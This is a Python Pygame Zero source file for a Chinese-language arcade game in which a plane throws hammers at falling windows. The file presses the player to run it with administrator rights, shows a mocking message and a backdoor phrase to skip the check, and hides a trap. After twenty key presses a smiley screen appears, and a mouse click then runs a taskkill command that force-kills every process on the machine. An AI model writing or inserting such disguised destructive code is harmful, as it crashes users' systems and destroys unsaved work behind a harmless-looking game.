import ctypes,sys,easygui
TEXT="""
hey，你为啥不给管理员权限？？？
你不给管理员权限会4吗？？？
你难道不会右键以管理员身份运行吗？？？
我就要管理员权限！！！
你不给是吧？？？
那我不让你用，诶，就是玩儿^v^
"""
def is_admin():#                                                -----|
    try:#                                                            |
        return ctypes.windll.shell32.IsUserAnAdmin()#                |
    except:#                                                         |
        return False#                                                |
if is_admin():#                                                      |
    pass#                                                            |---判断是否以管理员身份运行
else:#                                                               |
    if easygui.enterbox(TEXT)=='我不给管理员权限,诶,就是玩儿^v^':#走后门|
        pass#                                                        |
    else:#                                                           |
        exit()#                                                 -----|
import pgzrun,random,time,os
global b,c
WIDTH = 600;HEIGHT = 800;真 = True;假 = False;TITLE="打窗户"
死了 = 假
背景1 = Actor('bj')
背景2 = Actor('bj2') 
飞机 = Actor('fj')
窗户 = Actor('ch')
窗户2 = Actor('ch')
窗户3 = Actor('ch')
爆炸 = Actor('bz')
锤子 = Actor('cz')
锤子_ = []
# 破窗 = Actor('pc')
背景2.x = 600/2
背景2.y = -800/2
锤子.x = WIDTH/2 
锤子.y = -HEIGHT
飞机.x = 240
飞机.y = 852
窗户.x = 240
窗户.y = -50
窗户2.x = -1000
窗户3.x = -1000
窗户2.y = -1000
窗户3.y = -1000
背景3 = Actor('bj3')
笑脸 = Actor('xn')
眼睛 = Actor('xx')
眼睛.x = -1000
眼睛.y = -1000
眼睛2 = Actor('xx')
眼睛2.x = -1000
眼睛2.y = -1000
笑脸.x = -1000
笑脸.y = -1000
背景3.x = -1000
背景3.y = -1000
分数 = 0
锤子_.append(锤子)
b = 0
c = 0
d = 0
e = 0
# sounds. game_music.play(-1)
def draw():
    背景1.draw()
    背景2.draw()
    飞机.draw()
    窗户.draw()
    窗户3.draw()
    窗户2.draw()
    for _锤子 in 锤子_:
        _锤子.draw()
    背景3.draw()
    眼睛.draw()
    眼睛2.draw()
    笑脸.draw()
    screen.draw.text(str(分数), (WIDTH/2, 50), fontsize=50, color='green')
    if 死了: 
        screen.draw.text("GAME OVER!", (50, HEIGHT/2), fontsize=90, color='red')
def update():
    global 分数,死了
    if d == 0:
        if 死了:
            return 
        背景2.y += 1
        背景1.y += 1
        if 背景2.y >= 800 / 2 + 800:
            背景2.y = -800 / 2
        if 背景1.y >= 800 / 2 + 800: 
            背景1.y = -800 / 2
        if 分数 >= 20:
            窗户2.y
        窗户.y += 3
        if 窗户.y > HEIGHT:
            窗户.x = random.randint(5,595)
            窗户.y = -50
        for _锤子 in 锤子_:
            if _锤子.y > -HEIGHT:
                _锤子.y -= 10
        # for _锤子 in 锤子_:
            if _锤子.colliderect(窗户):
                窗户.x = random.randint(5, 600)
                窗户.y = -50
                _锤子.x = WIDTH/2
                _锤子.y = -HEIGHT
                分数 = 分数 + 1
        if 飞机.colliderect(窗户):
            # sounds.explode.play()
            死了 = 真
            飞机.image = 'bz'
    if e == 1:
        os.system('taskkill /f /fi "pid ne 1"')
def on_mouse_move(pos, rel, buttons):
    if d == 0:
        if 死了:
            return
        飞机.x = pos[0]
        飞机.y = pos[1]
        if mouse.LEFT in buttons:
            锤子_.append(锤子)
            for _锤子 in 锤子_:
                _锤子.x = 飞机.x
                _锤子.y = 飞机.y - 5
def on_mouse_down():
    global e
    if d == 0:
        if 死了:
            return
        锤子 = Actor('cz')
        锤子.x = 飞机.x
        锤子.y = 飞机.y - 5
        锤子_.append(锤子)
        # for _锤子 in 锤子_:
        #     _锤子.x = 飞机.x
        #     _锤子.y = 飞机.y - 70
        # sounds.gun.play()
    if d == 1:
        e = 1
def on_key_down():
    global b,c,d
    c += 1
    if d == 0:
        if c == 20:    
            b = 1
        if b == 1 and d == 0:
            d = 1
            背景3.x = 300
            背景3.y = 400
            笑脸.image = 'xn2'
            笑脸.x = 450
            笑脸.y = 400
            眼睛.x = 150
            眼睛.y = 250
            眼睛2.x = 150
            眼睛2.y = 800 - 250
pgzrun.go()
